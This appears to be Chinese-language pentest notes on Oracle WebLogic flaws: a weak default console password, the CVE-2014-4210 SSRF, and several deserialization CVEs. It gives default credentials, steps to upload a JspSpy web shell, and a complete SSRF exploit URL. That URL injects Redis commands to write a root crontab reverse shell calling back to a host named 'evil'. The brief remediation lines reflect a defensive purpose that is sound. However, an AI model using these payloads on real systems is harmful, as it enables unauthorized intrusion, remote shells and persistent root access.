# weblogic
## 控制台弱口令
### 漏洞说明
`http://your-ip:7001/console` 默认账号 weblogic:weblogic/Oracle@123
### 影响范围
/
### 验证方法
**pocsuite**:`poc_weblogic_weakpass.py`
### 利用方法
1. 登录后台
2. 上传war包，地址：`other/seven.war`,配置默认，下一步即可
3. 访问`http://127.0.0.1:7001/seven/JspSpy.jsp` 密码为`ninty`,此为大马
### 修复方式
修改weblogic登录口令为强口令

## weblogic ssrf漏洞 cve-2014-4210
### 漏洞说明
Weblogic服务端请求伪造漏洞出现在uddi组件中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件
### 影响范围
/
### 验证方法
**手动验证**:`http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001`
**pocsuite**:`poc_weblogic_ssrf.py`

### 利用方法
Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入`%0a%0d`来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。
发送三条redis命令，将弹shell脚本写入`/etc/crontab`：
```bash
set 1 "\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i >& /dev/tcp/evil/21 0>&1'\n\n\n\n"
config set dir /etc/
config set dbfilename crontab
save
```
进行url编码：
```html
set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20'sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261'%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave
```
url为：`http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.19.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa`
### 修复方式
删除将SearchPublicRegistries.jsp
## weblogic 反序列化漏洞
### 漏洞说明
利用xml decoded反序列化进行远程代码执行的漏洞，例如：CVE-2017-10271，CVE-2017-3506。
利用java反序列化进行远程代码执行的漏洞，例如：CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2628、CVE-2018-2894。
### 影响范围
\
### 验证方式
weblogicScanner:
`python ws.py -t 127.0.0.1 -p7001`
### 修复方式
/ 